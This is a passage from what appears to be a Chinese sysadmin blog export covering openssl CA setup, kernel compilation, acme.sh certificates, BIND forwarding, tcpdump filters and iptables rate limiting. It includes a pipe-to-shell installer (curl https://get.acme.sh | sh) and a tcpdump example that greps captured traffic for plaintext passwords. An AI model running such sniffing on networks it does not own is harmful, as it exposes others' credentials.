设置DN的显示顺序,默认是根据下面的policy匹配策略决定的,如果设置为yes,将根据csr请求的保持一致。(DN就是Distinguished Name,使用openssl x509 -text -noout查看证书中的Issuer和Subject就是DN信息) # 用于设置匹配DN名称策略的规则,不符合规则的csr请求会签发失败。有三种限制策略，如下 # match,该字段值必须与CA机构的证书中的字段完全匹配。 # supplied,代表必须添加的字段,内容不限 # optional,可选填写 policy = policy_match # 下面是两个自带的策略 [ policy_match ] countryName = match # csr中countryName的内容必须和ca机构证书的内容完全一致 stateOrProvinceName = match organizationName = match organizationalUnitName = optional commonName = supplied # csr中commonName字段内容必须存在 emailAddress = optional # csr中emailAddress可有可无 [ policy_anything ] countryName = optional stateOrProvinceName = optional localityName = optional organizationName = optional organizationalUnitName = optional commonName = supplied emailAddress = optional #################################################################### ","date":"2021-05-18 10:42","objectID":"/post/2402/:0:3","tags":["openssl"],"title":"openssl-配置文件学习","uri":"/post/2402/"},{"categories":["基础内容"],"content":"需要用到openssl s_server命令 查看man手册帮助man s_server 常用命令: openssl s_server -accept 443 -www -cert soulchild.com.crt -key soulchild.com.key ","date":"2021-05-18 09:03","objectID":"/post/2399/:0:0","tags":["openssl"],"title":"openssl-实现简单https服务快速测试证书","uri":"/post/2399/"},{"categories":["基础内容"],"content":"一、常用子命令 genrsa: 生成私钥 req: 用于生成证书和生成证书签名请求 x509: 查询证书信息 ca: 签发证书。管理维护已颁发的证书及其状态。 ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:1","tags":["ssl","tls","openssl"],"title":"openssl-创建CA、生成密钥、颁发、吊销证书等","uri":"/post/2391/"},{"categories":["基础内容"],"content":"二、使用rsa算法生成密钥对: 1.生成私钥，三种方式 # 生成私钥 openssl genrsa -out my.key # 生成私钥长度为4096 bit openssl genrsa -out my.key 4096 # 对私钥进行对称加密 openssl genrsa -out my.key -des3 2048 2.从私钥中提取公钥(一般不需要，因为申请的证书中包含公钥) openssl rsa -in my.key -pubout -out my.pub 非对称加密是不能公钥私钥相互推导的，但是上面的命令是从私钥文件中获取的公钥,这点我比较困惑。 下面是查了一些资料，了解的一部分内容，但还是不清晰 genrsa生成的私钥，不仅仅是私钥。可以通过openssl rsa -in my.key -text查看到。可能他是根据这里面额外的信息计算出的rsa公钥。 相关连接: https://stackoverflow.com/questions/5244129/use-rsa-private-key-to-generate-public-key https://security.stackexchange.com/questions/172274/can-i-get-a-public-key-from-an-rsa-private-key ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:2","tags":["ssl","tls","openssl"],"title":"openssl-创建CA、生成密钥、颁发、吊销证书等","uri":"/post/2391/"},{"categories":["基础内容"],"content":"三、自签CA: 默认配置文件: /etc/pki/tls/openssl.cnf 1.生成CA私钥 openssl genrsa -out /etc/pki/CA/private/cakey.pem chmod 600 /etc/pki/CA/private/cakey.pem 2.自签证书(自己给自己颁发证书) 交互式 openssl req -new -x509 -key /etc/pki/CA/private/cakey.pem -out /etc/pki/CA/cacert.pem -days 36500 -new: 生成一个新的证书签名请求 -x509: 输出自签名证书，而不是证书签名请求。 -key: 指定私钥 -out: 文件输出位置,默认stdout输出 -days: 申请的有效期 更多信息可以通过man req查询 20624-3ey3z04cspn.png 非交互式 openssl req -new -x509 -key /etc/pki/CA/private/cakey.pem -out /etc/pki/CA/cacert.pem -subj \"/C=CN/ST=Shanghai/L=Shanghai/O=SoulChild/OU=soulchild self-built CA/CN=ca.soulchild.com/emailAddress=ca@soulchild.com\" -days 36500 3.CA配置初始化 # 生成索引数据库文件 touch /etc/pki/CA/index.txt # 配置当前应该颁发的证书的序列号 echo 00 \u003e /etc/pki/CA/serial # 创建证书吊销列表(crl)序列号文件 echo 00 \u003e /etc/pki/CA/crlnumber ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:3","tags":["ssl","tls","openssl"],"title":"openssl-创建CA、生成密钥、颁发、吊销证书等","uri":"/post/2391/"},{"categories":["基础内容"],"content":"四、客户端向CA申请证书 3.1 生成客户端私钥 openssl genrsa -out soulchild.com.key 3.2 生成客户端证书签名请求文件(csr) openssl req -new -key soulchild.com.key -days 3650 -out soulchild.com.csr -subj \"/C=CN/ST=Shanghai/L=Shanghai/O=SoulChild/OU=it/CN=it.soulchild.com/emailAddress=it@soulchild.com\" 3.3 向CA提交请求 # 复制给CA服务器 scp soulchild.com.csr root@172.17.10.150: ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:4","tags":["ssl","tls","openssl"],"title":"openssl-创建CA、生成密钥、颁发、吊销证书等","uri":"/post/2391/"},{"categories":["基础内容"],"content":"五、CA签名请求颁发证书 # 这里-out指定的路径一定要确定是不存在文件，下面的命令执行后首先会清空这个文件。 openssl ca -in soulchild.com.csr -out /etc/pki/CA/certs/soulchild.com.crt -days 365 # 这里指定的-days会覆盖请求文件中的days，以CA签发的有效期为准 默认会使用配置文件: /etc/pki/tls/openssl.cnf里设置的默认CA路径，我们上面创建的CA相关文件和配置文件是对应的，所以可以不用指定，否则需要指定CA的私钥和证书，需要使用-cert和-keyfile这两个参数 检查无误后同意签名 92786-sskypumaey.png ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:5","tags":["ssl","tls","openssl"],"title":"openssl-创建CA、生成密钥、颁发、吊销证书等","uri":"/post/2391/"},{"categories":["基础内容"],"content":"六、吊销证书 #1.吊销证书 openssl ca -revoke /etc/pki/CA/certs/xxx.crt #2.更新吊销证书列表 openssl ca -gencrl -out /etc/pki/CA/crl.pem ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:6","tags":["ssl","tls","openssl"],"title":"openssl-创建CA、生成密钥、颁发、吊销证书等","uri":"/post/2391/"},{"categories":["基础内容"],"content":"七、查看证书和吊销列表信息 1.查看证书信息 # 以文本可读的方式查看 openssl x509 -in certs/soulchild.com.crt -noout -text # 只查看有效期部分 openssl x509 -in certs/soulchild.com.crt -noout -dates # 只查看subject部分 openssl x509 -in certs/soulchild.com.crt -noout -subject 2.查看吊销列表信息 openssl crl -in crl.pem -noout -text 3.查看csr请求信息 openssl req -in soulchild.com.csr -noout -text ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:7","tags":["ssl","tls","openssl"],"title":"openssl-创建CA、生成密钥、颁发、吊销证书等","uri":"/post/2391/"},{"categories":["基础内容"],"content":"八、扩展 我们上面签发的证书是没有扩展项的,通过https使用证书时,chrome会报错Subject Alternative Name missing. 下面演示一个简单的方法添加subjectAltName扩展项,注意通过下面的方法会丢失一些默认的扩展项,如果需要可以自己加上来。 1.编写扩展信息配置文件 echo 'subjectAltName=DNS.1:it.soulchild.com,IP.1:127.0.0.1' \u003e soulchild.com_ext.cnf 2.签发证书 openssl ca -in ~/soulchild.com.csr -out certs/soulchild.com.crt -days 30 -extfile soulchild.com_ext.cnf 3.验证结果 openssl x509 -in certs/soulchild.com.crt -text -noout | grep -A 2 extensions 38869-s4hghwk79om.png 浏览器证书查看 59676-h9i5v25dfr.png ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:8","tags":["ssl","tls","openssl"],"title":"openssl-创建CA、生成密钥、颁发、吊销证书等","uri":"/post/2391/"},{"categories":["基础内容"],"content":"1.下载内核 wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.12.3.tar.xz ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:1","tags":["linux","kernel"],"title":"centos7编译安装5.12.3内核","uri":"/post/2385/"},{"categories":["基础内容"],"content":"2.安装编译环境 yum groupinstall -y \"Development Tools\" yum install -y ncurses elfutils-libelf-devel openssl-devel bc ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:2","tags":["linux","kernel"],"title":"centos7编译安装5.12.3内核","uri":"/post/2385/"},{"categories":["基础内容"],"content":"3.升级gcc wget http://gcc.gnu.org/pub/gcc/releases/gcc-4.9.0/gcc-4.9.0.tar.gz tar xf gcc-4.9.0.tar.gz cd gcc-4.9.0 ./contrib/download_prerequisites mkdir build cd build ../configure --enable-checking=release --enable-languages=c,c++ --disable-multilib make -j2 make install ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:3","tags":["linux","kernel"],"title":"centos7编译安装5.12.3内核","uri":"/post/2385/"},{"categories":["基础内容"],"content":"4.编译内核 # 解压 tar xf linux-5.12.3.tar.xz cd linux-5.12.3 # 复制当前内核的配置选项作为当前编译的配置文件 cp /boot/config-$(uname -r) .config # 选择自定义的配置 make menuconfig # 编译 sed -ri \"s#(CONFIG_RETPOLINE=).*#\\1n#\" .config make -j2 # 安装模块 make modules_install # 安装内核相关文件，会做如下修改 #安装bzImage为/boot/vmlinuz-VERSION-RELEASE #生成initramfs文件 #修改grub的配置文件 make install ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:4","tags":["linux","kernel"],"title":"centos7编译安装5.12.3内核","uri":"/post/2385/"},{"categories":["基础内容"],"content":"5. 修改默认启动内核重启 # 设置默认引导项 grub2-set-default 0 # 重启 reboot ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:5","tags":["linux","kernel"],"title":"centos7编译安装5.12.3内核","uri":"/post/2385/"},{"categories":["基础内容"],"content":"卸载步骤 删除模块/lib/modules/5.12.3/ 删除/boot/下5.12.3内核相关文件 修改grub菜单配置 设置默认启用内核 ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:6","tags":["linux","kernel"],"title":"centos7编译安装5.12.3内核","uri":"/post/2385/"},{"categories":["基础内容"],"content":" # 查看新硬盘 fdisk -l # 新硬盘分区 fdisk /dev/sdb # 格式化文件系统 mkfs.xfs /dev/sdb1 # 卸载旧分区 umount /boot # 挂载新分区 mount /dev/sdb1 /boot # 挂载旧boot分区 mkdir /boot.old mount /dev/sda1 /boot.old # 复制旧boot分区内容到新boot分区 cp -arT /boot.old /boot # 修改/etc/fstab中boot分区的挂载 /dev/sdb1 /boot xfs defaults 0 0 # 将旧磁盘的grub引导boot改为当前的boot grub2-install --boot-directory=/boot /dev/sda # 在新磁盘中安装grub grub2-install --boot-directory=/boot /dev/sdb # 重启 reboot 中间遇到grub rescue问题，通过如下方式进入系统 83619-kuch92x9te.png ","date":"2021-05-13 14:48","objectID":"/post/2382/:0:0","tags":["linux"],"title":"更改boot分区为新磁盘","uri":"/post/2382/"},{"categories":["系统服务"],"content":"原文: 官方中文文档 https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E ","date":"2021-05-11 18:25","objectID":"/post/2367/:1:0","tags":["https","ssl","tls","acme"],"title":"使用acme.sh申请免费自动续期的证书","uri":"/post/2367/"},{"categories":["系统服务"],"content":"主要步骤: 安装 acme.sh 生成证书 copy 证书到 nginx 或者其他服务 更新证书 更新 acme.sh ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:0","tags":["https","ssl","tls","acme"],"title":"使用acme.sh申请免费自动续期的证书","uri":"/post/2367/"},{"categories":["系统服务"],"content":"1. 安装acme.sh curl https://get.acme.sh | sh 普通用户和 root 用户都可以安装使用. 安装过程进行了以下几步: 把acme.sh安装到你的 home 目录下: ~/.acme.sh/ 并创建 一个 bash 的 alias, 方便你的使用: alias acme.sh=~/.acme.sh/acme.sh 自动为你创建 cronjob, 每天 0:00 点自动检测所有的证书, 如果快过期了, 需要更新, 则会自动更新证书. 更高级的安装选项请参考: https://github.com/Neilpang/acme.sh/wiki/How-to-install 安装过程不会污染已有的系统任何功能和文件, 所有的修改都限制在安装目录中: ~/.acme.sh/ ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:1","tags":["https","ssl","tls","acme"],"title":"使用acme.sh申请免费自动续期的证书","uri":"/post/2367/"},{"categories":["系统服务"],"content":"2. 生成证书 acme.sh实现了acme协议支持的所有验证协议. 一般有两种方式验证: http和dns验证(支持申请泛解析证书). 如果你可以调用域名提供商提供的api，你可以配置自动解析(否则需要手动添加txt记录)，国内的支持阿里云、dnspod.cn、华为云等。我这里使用的是自动alidns验证，更多其他提供商以及使用方法可以查看下面的链接 https://github.com/acmesh-official/acme.sh/wiki/dnsapi 2.1 配置阿里DNS的key和secret export Ali_Key=\"xxxxxxxxxxxxxxx\" export Ali_Secret=\"xxxxxxxxxxxxxxx\" 2.2 申请颁发证书并使用阿里api校验dns(此过程会添加txt记录，完成后会自动删除) acme.sh --issue --dns dns_ali -d soulchild.site -d *.soulchild.site 也可以更换CA颁发机构: https://github.com/acmesh-official/acme.sh/wiki/Server 74192-sxdlyp31s.png ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:2","tags":["https","ssl","tls","acme"],"title":"使用acme.sh申请免费自动续期的证书","uri":"/post/2367/"},{"categories":["系统服务"],"content":"3.修改nginx配置文件 listen 443; server_name soulchild.site www.soulchild.site; ssl on; ssl_certificate ssl/soulchild.site.crt; ssl_certificate_key ssl/soulchild.site.key; ssl_session_timeout 5m; ssl_protocols TLSv1.3 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_prefer_server_ciphers on; 将上面的证书(ssl_certificate)和私钥(ssl_certificate_key)修改为你的路径 ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:3","tags":["https","ssl","tls","acme"],"title":"使用acme.sh申请免费自动续期的证书","uri":"/post/2367/"},{"categories":["系统服务"],"content":"4.copy证书并使nginx生效 步骤2成功执行后会将证书存储到~/.acme.sh/目录下，但请不要直接使用这些文件，这是acme.sh内部使用的,下面是正确使用步骤。 acme.sh --install-cert -d soulchild.site \\ --key-file /etc/nginx/ssl/soulchild.site.key \\ --fullchain-file /etc/nginx/ssl/soulchild.site.crt \\ --reloadcmd \"systemctl reload nginx\" --install-cert: 这个参数代表cpoy -d: 你的域名 --key-file: copy你的私钥文件,需要和nginx指定的一致 --fullchain-file: copy你的证书链文件(此文件包含自己和中间ca机构的证书),需要和nginx指定的一致 --reloadcmd: 指定重新加载证书的命令 ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:4","tags":["https","ssl","tls","acme"],"title":"使用acme.sh申请免费自动续期的证书","uri":"/post/2367/"},{"categories":["系统服务"],"content":"4.访问校验 ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:5","tags":["https","ssl","tls","acme"],"title":"使用acme.sh申请免费自动续期的证书","uri":"/post/2367/"},{"categories":["系统服务"],"content":"5.后期维护命令 acme.sh --list: 列出所有证书 acme.sh --renew -d soulchild.site -d *.soulchild.site --force: 手动强制更新证书 acme.sh --renew-all: 手动更新所有证书 acme.sh --revoke: 撤销证书 acme.sh --remove -d soulchild.site: 删除证书 acme.sh --cron: 通过cronjob更新所有证书。 acme.sh --upgrade: 升级acme.sh acme.sh --uninstall: 卸载acme.sh ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:6","tags":["https","ssl","tls","acme"],"title":"使用acme.sh申请免费自动续期的证书","uri":"/post/2367/"},{"categories":["系统服务"],"content":"6.配置当执行cronjob时，发送钉钉通知 export DINGTALK_WEBHOOK='https://oapi.dingtalk.com/robot/send?access_token=xxx' export DINGTALK_KEYWORD=acme acme.sh --set-notify --notify-hook dingtalk 其他参数和通知方式可查看官方文档https://github.com/acmesh-official/acme.sh/wiki/notify ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:7","tags":["https","ssl","tls","acme"],"title":"使用acme.sh申请免费自动续期的证书","uri":"/post/2367/"},{"categories":["基础内容"],"content":"1. 作为转发服务器需要开启递归查询 recursion yes; ","date":"2021-05-11 11:42","objectID":"/post/2365/:1:0","tags":["dns"],"title":"DNS服务bind转发配置简介","uri":"/post/2365/"},{"categories":["基础内容"],"content":"2. 两种转发的配置 ","date":"2021-05-11 11:42","objectID":"/post/2365/:2:0","tags":["dns"],"title":"DNS服务bind转发配置简介","uri":"/post/2365/"},{"categories":["基础内容"],"content":"2.1 全局转发 本dns没有的区域，会全都转发给指定的DNS服务器 recursion yes; forward first|only; forwarders { 223.5.5.5; 223.6.6.6; }; ","date":"2021-05-11 11:42","objectID":"/post/2365/:2:1","tags":["dns"],"title":"DNS服务bind转发配置简介","uri":"/post/2365/"},{"categories":["基础内容"],"content":"2.2 区域转发 只对指定的区域做转发，如果同时配置了全局转发，这里优先级高于全局的配置 zone \"soulchild.cn\" { type forward; forward first|only; forwarders { 172.17.20.250; }; }; ","date":"2021-05-11 11:42","objectID":"/post/2365/:2:2","tags":["dns"],"title":"DNS服务bind转发配置简介","uri":"/post/2365/"},{"categories":["基础内容"],"content":"first和only的区别 forward first: 先使用forwarders指定的DNS服务器做解析，如果查询不到再使用本地DNS服务器做域名解析 forward only: 只会使用forwarders指定的DNS服务器做解析，如果查询不到则返回DNS查询失败 ","date":"2021-05-11 11:42","objectID":"/post/2365/:2:3","tags":["dns"],"title":"DNS服务bind转发配置简介","uri":"/post/2365/"},{"categories":["基础内容"],"content":"图解TLS: http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html 包含所有tcp协议的数据包: 94119-2mbupgg2bcm.png 只包含tls协议的数据包: 65726-11z46o0z2r5m.png 单向证书通信过程: 13627-vmxhnvh1y9d.png ","date":"2021-05-08 13:35","objectID":"/post/2364/:0:0","tags":["https","ssl","tls"],"title":"SSL、TLS通信过程","uri":"/post/2364/"},{"categories":["基础内容"],"content":"建议阅读以下文章: SSL与数字证书（全五章）: https://www.2cto.com/Article/201203/121534.html 浅析数字证书: https://www.cnblogs.com/hyddd/archive/2009/01/07/1371292.html 数字签名是什么？: http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html 数字证书原理: https://www.cnblogs.com/JeffreySun/archive/2010/06/24/1627247.html 好文怕消失，备用链接: SSL与数字证书（全五章）: https://www.soulchild.cn/ssltls/121534.html 数字证书原理: https://www.soulchild.cn/ssltls/数字证书原理.html ","date":"2021-05-07 17:40","objectID":"/post/2361/:0:0","tags":["https","ssl","tls"],"title":"SSL、TLS、公钥、私钥、数字签名、数字证书等学习","uri":"/post/2361/"},{"categories":["基础内容"],"content":"参考地址: https://www.tcpdump.org/manpages/tcpdump.1.html https://danielmiessler.com/study/tcpdump/ https://www.tcpdump.org/manpages/pcap-filter.7.html ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:1","tags":["tcpdump"],"title":"tcpdump-命令使用","uri":"/post/2354/"},{"categories":["基础内容"],"content":"命令格式: tcpdump 参数 过滤器表达式 ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:2","tags":["tcpdump"],"title":"tcpdump-命令使用","uri":"/post/2354/"},{"categories":["基础内容"],"content":"描述: tcpdump可以捕获系统中的网络数据包。 当tcpdump完成捕获数据包时，会有一个统计返回(结果类似如下，最后三行)： 81349-gtoq0yio2ju.png captured: 这是tcpdump已接收和处理的数据包数 received by filter: 含义取决于运行tcpdump命令的操作系统 在某些操作系统上，它会对数据包进行计数，而不管它们是否与过滤表达式匹配，也不管tcpdump是否已读取并处理它们。 在某些操作系统上，它只计算被过滤器表达式匹配的数据包，而不管tcpdump是否已经读取和处理了它们 在某些操作系统上，它只计算被过滤器表达式匹配并被tcpdump处理的数据包 dropped by kernel: 由于缓冲区空间不足，而被tcpdump丢弃的数据包数量，可以通过-B参数设置缓冲区大小。 ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:3","tags":["tcpdump"],"title":"tcpdump-命令使用","uri":"/post/2354/"},{"categories":["基础内容"],"content":"参数: 参数较多，解释一部分 -A: 以ASCII格式打印每个数据包(减去其链路级报头)。便于抓取http请求。 -B (--buffer-size=buffer_size): 设置捕获缓冲区大小，单位为KiB(1024 bytes). -c: 收到指定数据包后退出。 -e: 显示mac地址 -w: 将捕获到的数据包输出到文件中。文件名支持使用strftime格式(例如: -w test-%H%M%S.pcap) -r: 从文件中读取数据包（使用-w选项保存的pcap文件）。如果文件为-，则使用标准输入。 -G: 每隔多长时间输出一个文件(文件名不能一样，否则会覆盖)，单位秒(s) -C: 当使用-w将数据包保存到文件时,单个文件保存的最大大小。1代表将近1M(1000000 bytes) -D: 显示操作系统中可以使用的网络接口 -E: 通过提供加密密钥来解密IPSEC通信。 -F: 指定一个文件，过滤器表达式将从这个文件中获取。 -i (--interface=interface): 指定捕获哪个网络接口的数据包,默认是tcpdump -D显示的第一个接口。 -l: 使stdout按照行缓冲。比如将结果重定向输出到文件的同时，可以看到接近实时的行输出.tcpdump -l | tee dat or tcpdump -l \u003e dat \u0026 tail -f dat -n: 不将ip解析成名称 -nn: 不将ip解析成域名，不将端口解析成名称 -#: 打印数据包编号 --print: 当使用-w时，stdout不会有数据包信息输出，加此参数可以同时输出.老版本不支持此参数 -Q: 数据包方向(in,out,inout),不是在所有平台都可以用 -q: 打印更少的协议信息 -S: 显示绝对的seq编号。默认单方向第一个条目显示绝对seq编号，后面的数据包显示的是相对的seq编号。(不知这么解释对不对)看下图吧 50576-2l4oigizl9u.png -s: 指定从每个数据包中获取数据的字节数，而不是默认的262144字节。-s0和默认值一样 -t: 不显示时间 -tt: 显示时间戳 -ttt: 与上一条的时间增量,详细请看man手册 -tttt: 可读性强的时间 -v: 打印IP数据包中的ttl，flags，总长度和选项等信息 -vv: 更详细的输出。 -vvv: 更详细的输出。 -X: 数据包内容以16进制和ascii格式显示 -XX: 同上，信息可能更多 ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:4","tags":["tcpdump"],"title":"tcpdump-命令使用","uri":"/post/2354/"},{"categories":["基础内容"],"content":"过滤器表达式 过滤表达式由一个或多个原语组成。原语的编写主要分为三个层面: 类型: 根据主机、网络、端口等信息过滤。如: host、net、port、portrange等。 例如: host xxx.com(也可以写ip),net 192.168.1.0/24,port 20(这里仅代表tcp和udp),portrange 6000-6008 传输方向: 根据源和目的进行过滤。如: src, dst, src or dst,src and dst等。 例如: src 192.168.1.10,dst 192.168.1.20 src or dst 192.168.1.1,src and dst 192.168.1.1,src or dst port 20 dst net 128.3.0.0 协议: 基于协议进行过滤。如: tcp、udp、icmp、ip、ip6、arp、rarp、wlan等。 例如: arp net 128.3, tcp port 21, udp portrange 7000-7009 常用原语 tcpdump捕获的数据包和表达式匹配结果为true，才是我们也要的结果，表达式中可以使用and(\u0026\u0026),or(||),not(!), dst: 目标主机。dst host 1.1.1.1也可以写成dst 1.1.1.1.因为默认是host，host可以被省略 src: 源主机。 ether dst: ether的目标地址(mac地址) ether src: ether的源地址(mac地址) net: 网络(网段) dst net: 目标网络 src net: 源网络 port: 端口 dst port: 目标端口 src port: 源端口 portrange: 端口范围 dst portrange: 目标端口范围 src portrange: 源端口范围 less: 数据包的长度小于或等于指定长度。less 32等同于len \u003c= 32 greater: 数据包的长度大于或等于指定长度。less 32等同于len \u003e= 32 ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:5","tags":["tcpdump"],"title":"tcpdump-命令使用","uri":"/post/2354/"},{"categories":["基础内容"],"content":"例子: 1.捕获源和目的是soulchild.cn相关的流量 tcpdump host soulchild.cn 2.捕获eth0网卡的流量 tcpdump -i eth0 3.根据源地址和目的地址捕获流量 tcpdump src 1.1.1.1 tcpdump dst 1.0.0.1 4.捕获源和目的是1.2.3.0/24网段的流量 tcpdump net 1.2.3.0/24 5.捕获与指定端口相关的流量 tcpdump port 3389 tcpdump src port 1025 tcpdump dst port 80 6.捕获指定协议的流量 tcpdump tcp tcpdump ip6 tcpdump icmp 7.捕获指定端口范围的流量 tcpdump portrange 20-21 8.根据数据包大小捕获流量 tcpdump less 32 tcpdump greater 64 tcpdump 'len \u003c= 128' 9.将捕获的数据包保存至文件和从文件读取 # 保存至文件中 tcpdump -w soulchild.cn.pcap 'host soulchild.cn and port 80' # 从文件读取 tcpdump -r soulchild.cn.pcap # 保存到文件中并同时在stdout输出 tcpdump --print -w soulchild.cn.pcap 'host soulchild.cn and port 80' 10.可读性较高的一种参数组合 tcpdump -ttnnvvS 11.源地址是10.5.2.3发送到任意主机的3389端口的数据包 tcpdump -nnvvS src 10.5.2.3 and dst port 3389 12.捕获从一个网络到另一个网络的数据包 tcpdump -nvX src net 192.168.0.0/16 and dst net 10.0.0.0/8 or 172.16.0.0/16 13.捕获目的地址是192.168.0.2并且不是icmp的数据包 tcpdump 'dst 192.168.0.2 and not icmp' # 指定协议的另一种写法 tcpdump 'dst 192.168.0.2 and not proto \\icmp' 14.捕获192.168.0.2进来的流量，并且不是22目的端口的流量 tcpdump -vv src 192.168.0.2 and not dst port 22 *根据tcp状态进行选择 tcp标志可用字段tcp-fin, tcp-syn, tcp-rst, tcp-push, tcp-ack, tcp-urg, tcp-ece, tcp-cwr. 15.捕获包含rst标志位的tcp数据包 tcpdump 'tcp[13] \u0026 4!=0' tcpdump 'tcp[tcpflags] == tcp-rst' 15.1.捕获包含syn标志位的tcp数据包 tcpdump 'tcp[13] \u0026 2!=0' tcpdump 'tcp[tcpflags] == tcp-syn' 15.2.捕获包含syn和ack的tcp数据包 tcpdump 'tcp[13]=18' tcpdump 'tcp[tcpflags] \u0026 (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)' 16.查找http user-agent tcpdump -vvAls0 | grep 'User-Agent:' 19.获取GET请求 tcpdump -vvAls0 | grep 'GET' 20.捕获DNS流量 tcpdump -vvAs0 port 53 21.捕获NTP流量 tcpdump -vvAs0 port 123 22.查找明文密码 tcpdump -lA port http or port ftp or port smtp or port imap or port pop3 or port telnet | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user ' 23.捕获指定状态的icmp包 icmp可用字段icmp-echoreply, icmp-unreach, icmp-sourcequench, icmp-redirect, icmp-echo, icmp-routeradvert, icmp-routersolicit, icmp-timxceed, icmp-paramprob, icmp-tstamp, icmp-tstampreply, icmp-ireq, icmp-ireqreply, icmp-maskreq, icmp-maskreply. #捕获icmp-echo(请求包) tcpdump icmp[icmptype] = icmp-echo #捕获icmp-echoreply(响应包) tcpdump icmp[icmptype] = icmp-echoreply #捕获不是icmp-echo、icmp-echoreply的状态 tcpdump icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply 24.查找带有\"Evil Bit\"的流量 IP报头中有一位永远不会被合法应用程序设置，我们称之为\"Evil Bit\"。 tcpdump 'ip[6] \u0026 128 != 0' 这里有一个tcpdump高级用法的解释: https://blog.csdn.net/zhaojie0708/article/details/103496004 ","date":"2021-04-28 14:19","objectID":"/post/2354/:0:6","tags":["tcpdump"],"title":"tcpdump-命令使用","uri":"/post/2354/"},{"categories":["其他","基础内容"],"content":"项目地址: https://github.com/man-pages-zh/manpages-zh 使用方法(centos/redhat): yum install man-pages-zh-CN export LANG=zh_CN.utf-8 命令行输入man 命令,查看帮助 man ls 09290-go66pces8p7.png ","date":"2021-04-28 11:03","objectID":"/post/2352/:0:0","tags":["linux"],"title":"linux-中文man手册","uri":"/post/2352/"},{"categories":["基础内容","系统服务"],"content":"recent模块 这个模块会将匹配的规则中，源IP地址写到一个列表中，还支持通过创建时间来匹配这个列表中的IP。 存储的内容在/proc/net/xt_recent/列表名称 --name name 指定一个列表名称 [!] --set 将数据包的源IP添加到列表中。如果源地址已经在列表中，则更新现有条目(比如时间戳)。 [!] --rcheck 检查当前规则中数据包的源IP，是否存在于指定的列表中 [!] --update 检查当前规则中数据包的源IP，是否存在于指定的列表中，如果存在，还会更新时间戳 [!] --remove 检查当前规则中数据包的源IP，是否存在于指定的列表中，如果存在，则会删除这个地址 [!] --seconds seconds * 此选项必须与--rcheck或--update一起使用。 这个选项只会检查指定秒内的IP地址。 比如: --rcheck --seconds 10: 检查当前规则中数据包的源IP，是否存在于指定的列表中，这个IP必须是在10秒内被写入列表的 [!] --hitcount hits * 此选项必须与--rcheck或--update一起使用。 要求接收到的数据包大于等于指定的次数(命中次数)。 比如: --rcheck --hitcount 3: 只有源IP，第三次(或以上)存在于列表中才会匹配成功 这个选项也可以结合--seconds选项是使用。 比如: --rcheck --hitcount 3 --seconds 10: 只有源IP，第三次(或以上)存在于列表中,并且是10秒内的，才会匹配成功 --rttl: * 此选项必须与--rcheck或--update一起使用。 要求接收到的数据包TTL值和--set生效时设置的一样。 手动操作列表中的IP # 将指定的IP添加到列表中 echo xx.xx.xx.xx \u003e /proc/net/ipt_recent/DEFAULT # 删除指定的IP echo -xx.xx.xx.xx \u003e /proc/net/ipt_recent/DEFAULT # 清空列表 echo clear \u003e /proc/net/ipt_recent/DEFAULT 模块本身参数的默认值： ip_list_tot=100 每个列表保存的IP数量 ip_pkt_list_tot=20 每个ip的当前数据包计数(当前是第几个包) ip_list_hash_size=0 哈希表大小，0表示根据ip_list_tot计算，其默认值为512 ip_list_perms=0644 ip列表文件权限/proc/net/ipt_recent/* debug=0 设置为1，可以获得更多调试信息 修改方法: # 1.停止iptables(如果需要保存别忘记保存规则) service iptables stop # 2.移除xt_recent模块 modprobe -r xt_recent # 3.修改参数 vim /etc/modprobe.d/xt_recent.conf options xt_recent ip_list_tot=1000 ip_pkt_list_tot=60 # 4.加载xt_recent模块 modprobe xt_recent # 5.检查配置参数 grep -r '.*' /sys/module/xt_recent/parameters/ # 6.启动iptables service iptables start 使用示例： eg1.每个IP只允许在5秒内建立2个基于tcp 80端口的连接 # 检查5秒内的ip列表中源IP是否存在2个 iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --name webpool --rcheck --seconds 5 --hitcount 2 -j DROP # 放行NEW状态的数据包，并记录至ip列表 iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --name webpool --set -j ACCEPT # 放行ESTABLISHED状态的数据包 iptables -A INPUT -p tcp --dport 80 -m state --state ESTABLISHED -j ACCEPT eg2.在连接ssh前，先使用ping才能连接 # 匹配icmp请求包(包大小为29),并将源IP加入ip列表（sudo ping 192.168.10.150 -s 1） iptables -I INPUT -p icmp --icmp-type 8 -m length --length 29 -m recent --name sshlogin --set -j REJECT --reject-with icmp-host-unreachable # 